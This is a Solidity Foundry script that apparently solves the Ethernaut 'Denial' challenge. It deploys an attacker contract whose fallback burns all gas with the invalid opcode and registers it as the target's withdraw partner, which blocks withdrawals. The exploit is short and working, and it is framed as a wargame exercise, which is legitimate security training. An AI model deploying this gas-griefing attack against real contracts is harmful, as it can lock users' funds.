// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Hacker {
    fallback() external payable {
        assembly {
            invalid()
        }
    }
}

contract DenialSolution is Script {
    Denial public code = Denial(payable(0x261B2272675734dc084e2f334610D06e9647cF42));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        address hacker = address(new Hacker());
        code.setWithdrawPartner(hacker);

        vm.stopBroadcast();
    }
}
